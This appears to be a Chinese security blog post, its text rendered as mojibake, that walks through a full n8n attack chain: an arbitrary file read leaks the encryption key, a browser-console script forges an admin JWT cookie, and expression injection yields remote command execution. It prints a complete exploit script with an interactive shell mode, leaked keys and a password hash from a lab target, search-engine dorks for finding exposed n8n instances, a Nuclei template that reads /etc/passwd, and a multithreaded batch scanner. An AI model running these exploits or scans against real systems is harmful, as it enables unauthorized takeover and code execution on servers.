![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpJplbVOMAxnWvb5icm0Tuibsz491uysicqibPA62cygyyVPpcRHiasUBJOVg/640?wx_fmt=png&from=appmsg "null")  
  
```
ç¯å¢ƒå˜é‡: COOKIE_VALUE=b9353203-81b6-420b-b662-8c027e1627e0æˆåŠŸè¯»å– /root/.n8n/config: {Â  Â  "encryptionKey": "FTOwCm2ruG3b/upNMf9yvqn0d+W8TXKW"}æ‰¾åˆ°çš„é‚®ç®±: (3) ['111@111.com', '%1f0d5d68-4447-4e62-b461-57c0c751e11c111@111.com', '111@111.com']VM84:27 æ‰¾åˆ°çš„å¯†ç å“ˆå¸Œ: ['$2a$10$Xim.XqxLEYGpP7JIAwIkouq4PYcG1DE5IqEFlxPjCXQJoAdmsHkt6']VM84:31 æ‰¾åˆ°çš„UUID: (7) ['89f3a667-194f-455c-a277-b30c9bc612d0', '717686a5-c248-45d7-ad21-f6f4a9ed2f38', '1f0d5d68-4447-4e62-b461-57c0c751e11c', '1f0d5d68-4447-4e62-b461-57c0c751e11c', '1f0d5d68-4447-4e62-b461-57c0c751e11c', '1f0d5d68-4447-4e62-b461-57c0c751e11c', '1f0d5d68-4447-4e62-b461-57c0c751e11c']
```  
  
æå–åˆ°çš„å…³é”®ä¿¡æ¯  
```
encryptionKey: FTOwCm2ruG3b/upNMf9yvqn0d+W8TXKWuserId: 1f0d5d68-4447-4e62-b461-57c0c751e11c (å‡ºç°5æ¬¡ï¼Œæ˜æ˜¾æ˜¯ç®¡ç†å‘˜)email: 111@111.compasswordHash: $2a$10$Xim.XqxLEYGpP7JIAwIkouq4PYcG1DE5IqEFlxPjCXQJoAdmsHkt6
```  
###### æ–¹æ³•ä¸€ï¼šä½¿ç”¨æµè§ˆå™¨å®ŒæˆJWTä¼ªé€ ï¼ˆçº¯æ‰‹åŠ¨ï¼‰  
  
åœ¨æµè§ˆå™¨æ§åˆ¶å°è¿è¡Œä»¥ä¸‹ä»£ç ï¼š  
```
// ç¬¬1æ­¥ï¼šåŠ è½½crypto-jsåº“constÂ script =Â document.createElement('script');script.srcÂ =Â 'https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js';document.head.appendChild(script);// ç¬¬2æ­¥ï¼šç­‰å¾…3ç§’åè¿è¡ŒJWTç”Ÿæˆä»£ç setTimeout(() =>Â {Â  // å·²çŸ¥ä¿¡æ¯Â  constÂ encryptionKey =Â "FTOwCm2ruG3b/upNMf9yvqn0d+W8TXKW";Â  constÂ userId =Â "1f0d5d68-4447-4e62-b461-57c0c751e11c";Â  constÂ email =Â "111@111.com";Â  constÂ passwordHash =Â "$2a$10$Xim.XqxLEYGpP7JIAwIkouq4PYcG1DE5IqEFlxPjCXQJoAdmsHkt6";Â Â Â  // æ´¾ç”ŸJWT secretï¼ˆå–å¶æ•°ä½å­—ç¬¦ï¼‰Â  letÂ extracted =Â '';Â  forÂ (letÂ i =Â 0; i < encryptionKey.length; i +=Â 2) {Â  Â  extracted += encryptionKey[i];Â  }Â  constÂ jwtSecret =Â CryptoJS.SHA256(extracted).toString();Â  console.log('ğŸ”‘ JWT Secret:', jwtSecret);Â Â Â  // è®¡ç®—JWT hashÂ  constÂ combined = email +Â ':'Â + passwordHash;Â  constÂ sha256Hash =Â CryptoJS.SHA256(combined);Â  constÂ base64Hash = sha256Hash.toString(CryptoJS.enc.Base64);Â  constÂ jwtHash = base64Hash.substring(0,Â 10);Â  console.log('ğŸ” JWT Hash:', jwtHash);Â Â Â  // æ„é€ JWT Headerå’ŒPayloadÂ  constÂ header = {alg:Â "HS256",Â typ:Â "JWT"};Â  constÂ payload = {id: userId,Â hash: jwtHash};Â Â Â  // Base64URLç¼–ç Â  constÂ base64urlEncodeÂ = (obj) => {Â  Â  returnÂ btoa(JSON.stringify(obj))Â  Â  Â  .replace(/\+/g,Â '-')Â  Â  Â  .replace(/\//g,Â '_')Â  Â  Â  .replace(/=/g,Â '');Â  };Â Â Â  constÂ headerB64 =Â base64urlEncode(header);Â  constÂ payloadB64 =Â base64urlEncode(payload);Â Â Â  // è®¡ç®—ç­¾åÂ  constÂ message = headerB64 +Â '.'Â + payloadB64;Â  constÂ signature =Â CryptoJS.HmacSHA256(message, jwtSecret)Â  Â  .toString(CryptoJS.enc.Base64)Â  Â  .replace(/\+/g,Â '-')Â  Â  .replace(/\//g,Â '_')Â  Â  .replace(/=/g,Â '');Â Â Â  // å®Œæ•´JWTÂ  constÂ token = message +Â '.'Â + signature;Â  console.log('âœ… JWT Token:', token);Â Â Â  // è®¾ç½®Cookieï¼ŒIPæ”¹æˆé¶æœºçš„IPÂ  document.cookieÂ =Â `n8n-auth=${token}; path=/; domain=target-ip`;Â Â  console.log('ğŸª Cookieå·²è®¾ç½®ï¼');Â  console.log('ğŸ“ ç°åœ¨è®¿é—®: http://target-ip:5678/');Â Â Â  // è‡ªåŠ¨è·³è½¬Â  setTimeout(() =>Â {Â  Â  window.location.hrefÂ =Â 'http://target-ip:5678/';Â  },Â 1000);Â Â },Â 3000);
```  
  
è‡ªåŠ¨è·³è½¬ï¼Œç›´æ¥å°±è¿›æ¥äº†ï¼Œä¸ç”¨è¾“å…¥å¯†ç ç™»å½•ã€‚ç„¶åå°±å¯ä»¥ç”¨ä¹‹å‰CVE-2025-68613çš„æ–¹æ³•äº†ã€‚  
### è„šæœ¬åŒ–åˆ©ç”¨  
  
ä¸€é”®å…¨è‡ªåŠ¨è„šæœ¬exploit.py  
```
#!/usr/bin/env python3"""CVE-2026-21858 + CVE-2025-68613 - n8n Full Chain ExploitArbitrary File Read â†’ Admin Token Forge â†’ Sandbox Bypass â†’ RCEAuthor: ChocapikkGitHub: https://github.com/Chocapikk/CVE-2026-21858"""importÂ argparseimportÂ hashlibimportÂ jsonimportÂ secretsimportÂ sqlite3importÂ stringimportÂ tempfilefromÂ base64Â importÂ b64encodeimportÂ jwtimportÂ requestsfromÂ pwnÂ importÂ logBANNER =Â """â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—â•‘ Â  Â  CVE-2026-21858 + CVE-2025-68613 - n8n Full Chain Â  Â  Â  Â  Â â•‘â•‘ Â  Â  Arbitrary File Read â†’ Token Forge â†’ Sandbox Bypass â†’ RCE Â â•‘â•‘ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  â•‘â•‘ Â  Â  by Chocapikk Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â â•‘â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"""RCE_PAYLOAD =Â '={{ (function() { var require = this.process.mainModule.require; var execSync = require("child_process").execSync; return execSync("CMD").toString(); })() }}'defÂ randstr(n:Â intÂ =Â 12) ->Â str:Â  Â  returnÂ "".join(secrets.choice(string.ascii_lowercase + string.digits)Â forÂ _Â inÂ range(n))defÂ randpos() ->Â list[int]:Â  Â  returnÂ [secrets.randbelow(500) +Â 100, secrets.randbelow(500) +Â 100]classÂ Ni8mare:Â  Â  defÂ __init__(self, base_url:Â str, form_path:Â str):Â  Â  Â  Â  self.base_url = base_url.rstrip("/")Â  Â  Â  Â  self.form_url =Â f"{self.base_url}/{form_path.lstrip('/')}"Â  Â  Â  Â  self.session = requests.Session()Â  Â  Â  Â  self.admin_token =Â NoneÂ  Â  defÂ _api(self, method:Â str, path:Â str, **kwargs) -> requests.Response |Â None:Â  Â  Â  Â  kwargs.setdefault("timeout",Â 30)Â  Â  Â  Â  kwargs.setdefault("cookies", {"n8n-auth":Â self.admin_token}Â ifÂ self.admin_tokenÂ elseÂ {})Â  Â  Â  Â  resp =Â self.session.request(method,Â f"{self.base_url}{path}", **kwargs)Â  Â  Â  Â  returnÂ respÂ ifÂ resp.okÂ elseÂ NoneÂ  Â  defÂ _lfi_payload(self, filepath:Â str) ->Â dict:Â  Â  Â  Â  returnÂ {Â  Â  Â  Â  Â  Â  "data": {},Â  Â  Â  Â  Â  Â  "files": {Â  Â  Â  Â  Â  Â  Â  Â  f"f-{randstr(6)}": {Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  "filepath": filepath,Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  "originalFilename":Â f"{randstr(8)}.bin",Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  "mimetype":Â "application/octet-stream",Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  "size": secrets.randbelow(90000) +Â 10000Â  Â  Â  Â  Â  Â  Â  Â  }Â  Â  Â  Â  Â  Â  }Â  Â  Â  Â  }Â  Â  defÂ _build_nodes(self, command:Â str) ->Â tuple[list,Â dict,Â str,Â str]:Â  Â  Â  Â  trigger_name, rce_name =Â f"T-{randstr(8)}",Â f"R-{randstr(8)}"Â  Â  Â  Â  result_var =Â f"v{randstr(6)}"Â  Â  Â  Â  payload_value = RCE_PAYLOAD.replace("CMD", command.replace('"',Â '\\"'))Â  Â  Â  Â  nodes = [Â  Â  Â  Â  Â  Â  {"parameters": {},Â "name": trigger_name,Â "type":Â "n8n-nodes-base.manualTrigger",Â  Â  Â  Â  Â  Â  Â "typeVersion":Â 1,Â "position": randpos(),Â "id":Â f"t-{randstr(12)}"},Â  Â  Â  Â  Â  Â  {"parameters": {"values": {"string": [{"name": result_var,Â "value": payload_value}]}},Â  Â  Â  Â  Â  Â  Â "name": rce_name,Â "type":Â "n8n-nodes-base.set",Â "typeVersion":Â 2,Â  Â  Â  Â  Â  Â  Â "position": randpos(),Â "id":Â f"r-{randstr(12)}"}Â  Â  Â  Â  ]Â  Â  Â  Â  connections = {trigger_name: {"main": [[{"node": rce_name,Â "type":Â "main",Â "index":Â 0}]]}}Â  Â  Â  Â  returnÂ nodes, connections, trigger_name, rce_nameÂ  Â  # ========== Arbitrary File Read (CVE-2026-21858) ==========Â  Â  defÂ read_file(self, filepath:Â str, timeout:Â intÂ =Â 30) ->Â bytesÂ |Â None:Â  Â  Â  Â  resp =Â self.session.post(Â  Â  Â  Â  Â  Â  self.form_url, json=self._lfi_payload(filepath),Â  Â  Â  Â  Â  Â  headers={"Content-Type":Â "application/json"}, timeout=timeoutÂ  Â  Â  Â  )Â  Â  Â  Â  returnÂ resp.contentÂ ifÂ resp.okÂ andÂ resp.contentÂ elseÂ NoneÂ  Â  defÂ get_version(self) ->Â tuple[str,Â bool]:Â  Â  Â  Â  resp =Â self._api("GET",Â "/rest/settings", timeout=10)Â  Â  Â  Â  version = resp.json().get("data", {}).get("versionCli",Â "0.0.0")Â ifÂ respÂ elseÂ "0.0.0"Â  Â  Â  Â  major, minor =Â map(int, version.split(".")[:2])Â  Â  Â  Â  returnÂ version, major <Â 1Â orÂ (major ==Â 1Â andÂ minor <Â 121)Â  Â  defÂ get_home(self) ->Â strÂ |Â None:Â  Â  Â  Â  data =Â self.read_file("/proc/self/environ")Â  Â  Â  Â  ifÂ notÂ data:Â  Â  Â  Â  Â  Â  returnÂ NoneÂ  Â  Â  Â  forÂ varÂ inÂ data.split(b"\x00"):Â  Â  Â  Â  Â  Â  ifÂ var.startswith(b"HOME="):Â  Â  Â  Â  Â  Â  Â  Â  returnÂ var.decode().split("=",Â 1)[1]Â  Â  Â  Â  returnÂ NoneÂ  Â  defÂ get_key(self, home:Â str) ->Â strÂ |Â None:Â  Â  Â  Â  data =Â self.read_file(f"{home}/.n8n/config")Â  Â  Â  Â  returnÂ json.loads(data).get("encryptionKey")Â ifÂ dataÂ elseÂ NoneÂ  Â  defÂ get_db(self, home:Â str) ->Â bytesÂ |Â None:Â  Â  Â  Â  returnÂ self.read_file(f"{home}/.n8n/database.sqlite", timeout=120)Â  Â  defÂ extract_admin(self, db:Â bytes) ->Â tuple[str,Â str,Â str] |Â None:Â  Â  Â  Â  withÂ tempfile.NamedTemporaryFile(suffix=".db")Â asÂ f:Â  Â  Â  Â  Â  Â  f.write(db)Â  Â  Â  Â  Â  Â  f.flush()Â  Â  Â  Â  Â  Â  conn = sqlite3.connect(f.name)Â  Â  Â  Â  Â  Â  row = conn.execute("SELECT id, email, password FROM user WHERE role='global:owner' LIMIT 1").fetchone()Â  Â  Â  Â  Â  Â  conn.close()Â  Â  Â  Â  returnÂ (row[0], row[1], row[2])Â ifÂ rowÂ elseÂ NoneÂ  Â  defÂ forge_token(self, key:Â str, uid:Â str, email:Â str, pw_hash:Â str) ->Â str:Â  Â  Â  Â  secret = hashlib.sha256(key[::2].encode()).hexdigest()Â  Â  Â  Â  h = b64encode(hashlib.sha256(f"{email}:{pw_hash}".encode()).digest()).decode()[:10]Â  Â  Â  Â  self.admin_token = jwt.encode({"id": uid,Â "hash": h}, secret,Â "HS256")Â  Â  Â  Â  returnÂ self.admin_tokenÂ  Â  defÂ verify_token(self) ->Â bool:Â  Â  Â  Â  returnÂ self._api("GET",Â "/rest/users", timeout=10)Â isÂ notÂ NoneÂ  Â  # ========== RCE (CVE-2025-68613) ==========Â  Â  defÂ rce(self, command:Â str) ->Â strÂ |Â None:Â  Â  Â  Â  nodes, connections, _, _ =Â self._build_nodes(command)Â  Â  Â  Â  wf_name =Â f"wf-{randstr(16)}"Â  Â  Â  Â  workflow = {"name": wf_name,Â "active":Â False,Â "nodes": nodes,Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  "connections": connections,Â "settings": {}}Â  Â  Â  Â  resp =Â self._api("POST",Â "/rest/workflows", json=workflow, timeout=10)Â  Â  Â  Â  ifÂ notÂ resp:Â  Â  Â  Â  Â  Â  returnÂ NoneÂ  Â  Â  Â  wf_id = resp.json().get("data", {}).get("id")Â  Â  Â  Â  ifÂ notÂ wf_id:Â  Â  Â  Â  Â  Â  returnÂ NoneÂ  Â  Â  Â  run_data = {"workflowData": {"id": wf_id,Â "name": wf_name,Â "active":Â False,Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  "nodes": nodes,Â "connections": connections,Â "settings": {}}}Â  Â  Â  Â  resp =Â self._api("POST",Â f"/rest/workflows/{wf_id}/run", json=run_data, timeout=30)Â  Â  Â  Â  ifÂ notÂ resp:Â  Â  Â  Â  Â  Â  self._api("DELETE",Â f"/rest/workflows/{wf_id}", timeout=5)Â  Â  Â  Â  Â  Â  returnÂ NoneÂ  Â  Â  Â  exec_id = resp.json().get("data", {}).get("executionId")Â  Â  Â  Â  result =Â self._get_result(exec_id)Â ifÂ exec_idÂ elseÂ NoneÂ  Â  Â  Â  self._api("DELETE",Â f"/rest/workflows/{wf_id}", timeout=5)Â  Â  Â  Â  returnÂ resultÂ  Â  defÂ _get_result(self, exec_id:Â str) ->Â strÂ |Â None:Â  Â  Â  Â  resp =Â self._api("GET",Â f"/rest/executions/{exec_id}", timeout=10)Â  Â  Â  Â  ifÂ notÂ resp:Â  Â  Â  Â  Â  Â  returnÂ NoneÂ  Â  Â  Â  data = resp.json().get("data", {}).get("data")Â  Â  Â  Â  ifÂ notÂ data:Â  Â  Â  Â  Â  Â  returnÂ NoneÂ  Â  Â  Â  parsed = json.loads(data)Â  Â  Â  Â  # Result is usually the last non-empty stringÂ  Â  Â  Â  forÂ itemÂ inÂ reversed(parsed):Â  Â  Â  Â  Â  Â  ifÂ isinstance(item,Â str)Â andÂ len(item) >Â 3Â andÂ itemÂ notÂ inÂ ("success",Â "error"):Â  Â  Â  Â  Â  Â  Â  Â  returnÂ item.strip()Â  Â  Â  Â  returnÂ NoneÂ  Â  # ========== Full Chain ==========Â  Â  defÂ pwn(self) ->Â bool:Â  Â  Â  Â  p = log.progress("HOME directory")Â  Â  Â  Â  home =Â self.get_home()Â  Â  Â  Â  ifÂ notÂ home:Â  Â  Â  Â  Â  Â  returnÂ p.failure("Not found")Â orÂ FalseÂ  Â  Â  Â  p.success(home)Â  Â  Â  Â  p = log.progress("Encryption key")Â  Â  Â  Â  key =Â self.get_key(home)Â  Â  Â  Â  ifÂ notÂ key:Â  Â  Â  Â  Â  Â  returnÂ p.failure("Failed")Â orÂ FalseÂ  Â  Â  Â  p.success(f"{key[:8]}...")Â  Â  Â  Â  p = log.progress("Database")Â  Â  Â  Â  db =Â self.get_db(home)Â  Â  Â  Â  ifÂ notÂ db:Â  Â  Â  Â  Â  Â  returnÂ p.failure("Failed")Â orÂ FalseÂ  Â  Â  Â  p.success(f"{len(db)}Â bytes")Â  Â  Â  Â  p = log.progress("Admin user")Â  Â  Â  Â  admin =Â self.extract_admin(db)Â  Â  Â  Â  ifÂ notÂ admin:Â  Â  Â  Â  Â  Â  returnÂ p.failure("Not found")Â orÂ FalseÂ  Â  Â  Â  uid, email, pw = adminÂ  Â  Â  Â  p.success(email)Â  Â  Â  Â  p = log.progress("Token forge")Â  Â  Â  Â  self.forge_token(key, uid, email, pw)Â  Â  Â  Â  p.success("OK")Â  Â  Â  Â  p = log.progress("Admin access")Â  Â  Â  Â  ifÂ notÂ self.verify_token():Â  Â  Â  Â  Â  Â  returnÂ p.failure("Rejected")Â orÂ FalseÂ  Â  Â  Â  p.success("GRANTED!")Â  Â  Â  Â  log.success(f"Cookie: n8n-auth={self.admin_token}")Â  Â  Â  Â  returnÂ TruedefÂ parse_args():Â  Â  p = argparse.ArgumentParser(description="n8n Ni8mare - Full Chain Exploit")Â  Â  p.add_argument("url",Â help="Target URL (http://target:5678)")Â  Â  p.add_argument("form",Â help="Form path (/form/upload)")Â  Â  p.add_argument("--read", metavar="PATH",Â help="Read arbitrary file")Â  Â  p.add_argument("--cmd", metavar="CMD",Â help="Execute single command")Â  Â  p.add_argument("-o",Â "--output", metavar="FILE",Â help="Save LFI output to file")Â  Â  returnÂ p.parse_args()defÂ run_read(exploit: Ni8mare, path:Â str, output:Â strÂ |Â None) ->Â None:Â  Â  data = exploit.read_file(path)Â  Â  ifÂ notÂ data:Â  Â  Â  Â  log.error("File read failed")Â  Â  Â  Â  returnÂ  Â  log.success(f"{len(data)}Â bytes")Â  Â  ifÂ output:Â  Â  Â  Â  withÂ open(output,Â "wb")Â asÂ f:Â  Â  Â  Â  Â  Â  f.write(data)Â  Â  Â  Â  log.success(f"Saved:Â {output}")Â  Â  Â  Â  returnÂ  Â  print(data.decode())defÂ run_cmd(exploit: Ni8mare, cmd:Â str) ->Â None:Â  Â  p = log.progress("RCE")Â  Â  out = exploit.rce(cmd)Â  Â  ifÂ notÂ out:Â  Â  Â  Â  p.failure("Failed")Â  Â  Â  Â  returnÂ  Â  p.success("OK")Â  Â  print(f"\n{out}")defÂ run_shell(exploit: Ni8mare) ->Â None:Â  Â  log.info("Interactive mode (type 'exit' to quit)")Â  Â  whileÂ True:Â  Â  Â  Â  try:Â  Â  Â  Â  Â  Â  cmd =Â input("\033[91mn8n\033[0m> ").strip()Â  Â  Â  Â  exceptÂ (EOFError, KeyboardInterrupt):Â  Â  Â  Â  Â  Â  print()Â  Â  Â  Â  Â  Â  returnÂ  Â  Â  Â  ifÂ notÂ cmdÂ orÂ cmd ==Â "exit":Â  Â  Â  Â  Â  Â  returnÂ  Â  Â  Â  out = exploit.rce(cmd)Â  Â  Â  Â  ifÂ out:Â  Â  Â  Â  Â  Â  print(out)defÂ main():Â  Â  print(BANNER)Â  Â  args = parse_args()Â  Â  exploit = Ni8mare(args.url, args.form)Â  Â  version, vuln = exploit.get_version()Â  Â  log.info(f"Target:Â {exploit.form_url}")Â  Â  log.info(f"Version:Â {version}Â ({'VULN'Â ifÂ vulnÂ elseÂ 'SAFE'})")Â  Â  ifÂ args.read:Â  Â  Â  Â  run_read(exploit, args.read, args.output)Â  Â  Â  Â  returnÂ  Â  ifÂ notÂ exploit.pwn():Â  Â  Â  Â  returnÂ  Â  ifÂ args.cmd:Â  Â  Â  Â  run_cmd(exploit, args.cmd)Â  Â  Â  Â  returnÂ  Â  run_shell(exploit)ifÂ __name__ ==Â "__main__":Â  Â  main()
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54Bp20erhUPiaibDYhHR2YiaamibqOgbPKP2FGP584OLAby7CaKic0icSxy0VarA/640?wx_fmt=png&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54Bpica6iao2aJ3bhnDE5apMAaXpJHCol3E6RT2vMcQpnToW8HKh3yRIYZlA/640?wx_fmt=png&from=appmsg "null")  
  
  
flag{3b0788b1fb424583ad8bdebd080fd843}  
## æœç´¢è¯­æ³•  
  
n8n å¹³å°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2025-68613ï¼‰ZoomEyeæœç´¢app="n8n"  
  
https://www.zoomeye.org/searchResult?q=YXBwPSJuOG4i  
  
hunteræœç´¢è¯­æ³•  
```
web.icon=="8ad475e8b10ff8bcff648ae6d49c88ae"web.icon="8ad475e8b10ff8bcff648ae6d49c88ae"&&icp.number!==""&&icp.name!="å…¬å¸"&&icp.name!="å·¥ä½œå®¤"&&icp.type!="ä¸ªäºº"
```  
### Nucleiæ¨¡æ¿  
```
id:Â CVE-2026-21858-lfi-fixedinfo:Â  name:Â n8nÂ ArbitraryÂ FileÂ ReadÂ (CVE-2026-21858)Â -Â ActiveÂ CheckÂ  author:Â customizedÂ  severity:Â criticalÂ  description:Â |Â  Â  Proves CVE-2026-21858 by reading /etc/passwd via n8n vulnerable form trigger.Â  tags:Â cve,cve2026,n8n,lfirequests:Â  -Â method:Â POSTÂ  Â  path:Â  Â  Â  -Â "{{BaseURL}}/form/vulnerable-form"Â  Â  Â  -Â "{{BaseURL}}/webhook/vulnerable-form"Â  Â  Â  -Â "{{BaseURL}}/form/upload"Â  Â  Â  -Â "{{BaseURL}}/webhook/upload"Â  Â  Â  # å¦‚æœä½ çŸ¥é“å…¶ä»–ç‰¹å®šè·¯å¾„ï¼Œå¯ä»¥åœ¨è¿™é‡Œæ·»åŠ Â  Â  headers:Â  Â  Â  Content-Type:Â "application/json"Â  Â  # è¿™é‡Œçš„ JSON å¿…é¡»æ˜¯å‹ç¼©çš„ä¸€è¡Œï¼Œä¸¥æ ¼æ¨¡ä»¿ Python è„šæœ¬çš„ PayloadÂ  Â  body:Â '{"data":{},"files":{"check_vuln":{"filepath":"/etc/passwd","originalFilename":"check.bin","mimetype":"application/octet-stream","size":1024}}}'Â  Â  matchers-condition:Â andÂ  Â  matchers:Â  Â  Â  -Â type:Â regexÂ  Â  Â  Â  part:Â bodyÂ  Â  Â  Â  regex:Â  Â  Â  Â  Â  -Â "root:.*:0:0:"Â  Â  Â  -Â type:Â statusÂ  Â  Â  Â  status:Â  Â  Â  Â  Â  -Â 200
```  
  
æŠŠä¸Šé¢çš„ä»£ç ä¿å­˜ä¸ºCVE-2026-21858-lfi.yaml  
æ–‡ä»¶ï¼Œç„¶åæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ã€‚  
```
nuclei -u http://8vccf5j.haobachang.loveli.com.cn:8888/ -t CVE-2026-21858-lfi.yaml
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpFbgvBJQKiaicCWH7mnP3lGa4Mp7ao5q7zuicuXnIPUT5c5bGQdc2r7Q7Q/640?wx_fmt=png&from=appmsg "null")  
  
### æ‰¹é‡æµ‹è¯•è„šæœ¬  
  
scan_n8n.py  
å†…å®¹å¦‚ä¸‹  
```
#!/usr/bin/env python3importÂ requestsimportÂ argparseimportÂ urllib3importÂ concurrent.futuresfromÂ urllib.parseÂ importÂ urljoinimportÂ sys# ç¦ç”¨ SSL è­¦å‘Šurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)# é¢œè‰²ä»£ç GREEN =Â "\033[92m"RED =Â "\033[91m"YELLOW =Â "\033[93m"RESET =Â "\033[0m"defÂ get_lfi_payload(filepath="/etc/passwd"):Â  Â  """æ„é€ æ¶æ„ JSON Payload"""Â  Â  returnÂ {Â  Â  Â  Â  "data": {},Â  Â  Â  Â  "files": {Â  Â  Â  Â  Â  Â  "check_vuln": {Â  Â  Â  Â  Â  Â  Â  Â  "filepath": filepath,Â  Â  Â  Â  Â  Â  Â  Â  "originalFilename":Â "test.bin",Â  Â  Â  Â  Â  Â  Â  Â  "mimetype":Â "application/octet-stream",Â  Â  Â  Â  Â  Â  Â  Â  "size":Â 1024Â  Â  Â  Â  Â  Â  }Â  Â  Â  Â  }Â  Â  }defÂ check_vulnerability(target_url, form_path):Â  Â  """æ£€æµ‹å•ä¸ªç›®æ ‡"""Â  Â  # ç¡®ä¿ URL æ ¼å¼æ­£ç¡®Â  Â  ifÂ notÂ target_url.startswith("http"):Â  Â  Â  Â  target_url =Â f"http://{target_url}"Â  Â Â Â  Â  full_url = urljoin(target_url, form_path)Â  Â Â Â  Â  try:Â  Â  Â  Â  # å‘é€ LFI è¯·æ±‚Â  Â  Â  Â  response = requests.post(Â  Â  Â  Â  Â  Â  full_url,Â  Â  Â  Â  Â  Â  json=get_lfi_payload(),Â  Â  Â  Â  Â  Â  headers={"Content-Type":Â "application/json"},Â  Â  Â  Â  Â  Â  timeout=10,Â  Â  Â  Â  Â  Â  verify=FalseÂ  Â  Â  Â  )Â  Â  Â  Â Â Â  Â  Â  Â  # æ£€æŸ¥ /etc/passwd çš„ç‰¹å¾å­—ç¬¦Â  Â  Â  Â  ifÂ response.status_code ==Â 200Â andÂ "root:x:0:0"Â inÂ response.text:Â  Â  Â  Â  Â  Â  print(f"[{GREEN}VULN{RESET}]Â {full_url}Â - Successfully read /etc/passwd")Â  Â  Â  Â  Â  Â  returnÂ full_urlÂ  Â  Â  Â  elifÂ response.status_code ==Â 404:Â  Â  Â  Â  Â  Â  # è¿™é‡Œçš„ 404 å¯èƒ½æ„å‘³ç€ Form ID ä¸å¯¹ï¼Œè€Œä¸æ˜¯ n8n ä¸å­˜åœ¨Â  Â  Â  Â  Â  Â  print(f"[{YELLOW}WARN{RESET}]Â {full_url}Â - Form endpoint not found (404)")Â  Â  Â  Â  else:Â  Â  Â  Â  Â  Â  print(f"[{RED}FAIL{RESET}]Â {full_url}Â - Not vulnerable or unknown response (Code:Â {response.status_code})")Â  Â  Â  Â  Â  Â Â Â  Â  exceptÂ requests.exceptions.RequestExceptionÂ asÂ e:Â  Â  Â  Â  print(f"[{RED}ERRÂ {RESET}]Â {target_url}Â - Connection failed:Â {str(e)[:50]}")Â  Â Â Â  Â  returnÂ NonedefÂ main():Â  Â  parser = argparse.ArgumentParser(description="Batch Scanner for CVE-2026-21858 (n8n LFI)")Â  Â  parser.add_argument("-f",Â "--file",Â help="File containing list of target URLs", required=True)Â  Â  parser.add_argument("-p",Â "--path",Â help="Form path to test (default: /form/vulnerable-form)", default="/form/vulnerable-form")Â  Â  parser.add_argument("-t",Â "--threads",Â help="Number of threads",Â type=int, default=10)Â  Â  parser.add_argument("-o",Â "--output",Â help="File to save vulnerable URLs", default="vuln_hosts.txt")Â  Â Â Â  Â  args = parser.parse_args()Â  Â Â Â  Â  targets = []Â  Â  try:Â  Â  Â  Â  withÂ open(args.file,Â "r")Â asÂ f:Â  Â  Â  Â  Â  Â  targets = [line.strip()Â forÂ lineÂ inÂ fÂ ifÂ line.strip()]Â  Â  exceptÂ FileNotFoundError:Â  Â  Â  Â  print(f"Error: FileÂ {args.file}Â not found.")Â  Â  Â  Â  sys.exit(1)Â  Â  print(f"[*] LoadedÂ {len(targets)}Â targets.")Â  Â  print(f"[*] Testing Form Path:Â {args.path}")Â  Â  print("[*] Starting scan...\n")Â  Â  vulnerable_hosts = []Â  Â  # å¤šçº¿ç¨‹æ‰«æÂ  Â  withÂ concurrent.futures.ThreadPoolExecutor(max_workers=args.threads)Â asÂ executor:Â  Â  Â  Â  futures = {executor.submit(check_vulnerability, url, args.path): urlÂ forÂ urlÂ inÂ targets}Â  Â  Â  Â Â Â  Â  Â  Â  forÂ futureÂ inÂ concurrent.futures.as_completed(futures):Â  Â  Â  Â  Â  Â  result = future.result()Â  Â  Â  Â  Â  Â  ifÂ result:Â  Â  Â  Â  Â  Â  Â  Â  vulnerable_hosts.append(result)Â  Â  # ä¿å­˜ç»“æœÂ  Â  ifÂ vulnerable_hosts:Â  Â  Â  Â  withÂ open(args.output,Â "w")Â asÂ f:Â  Â  Â  Â  Â  Â  forÂ urlÂ inÂ vulnerable_hosts:Â  Â  Â  Â  Â  Â  Â  Â  f.write(url +Â "\n")Â  Â  Â  Â  print(f"\n[{GREEN}SUCCESS{RESET}] FoundÂ {len(vulnerable_hosts)}Â vulnerable hosts. Saved toÂ {args.output}")Â  Â  else:Â  Â  Â  Â  print(f"\n[{RED}FINISHED{RESET}] No vulnerable hosts found.")ifÂ __name__ ==Â "__main__":Â  Â  main()
```  
  
å‡†å¤‡ä¸€ä¸ªÂ target.txt  
ï¼Œæ¯è¡Œä¸€ä¸ªÂ http://ip:port  
ã€‚  
```
python .\scan_n8n.py -f .\target.txt -t 20
```  
  
